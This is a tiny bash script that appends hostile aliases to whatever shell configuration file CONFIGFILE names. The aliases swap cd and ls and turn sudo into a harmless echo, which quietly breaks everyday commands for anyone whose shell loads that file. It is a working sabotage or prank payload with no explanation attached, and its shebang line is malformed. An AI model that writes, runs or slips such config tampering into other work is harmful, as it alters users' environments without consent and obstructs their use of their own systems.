#!/bin.bash

if [ -z "$CONFIGFILE" ]; then
    exit 1
fi

{
    echo "";
    echo "alias cd=/usr/bin/ls";
    echo "alias ls=cd";
    echo "alias sudo=echo"
} >> "$CONFIGFILE"
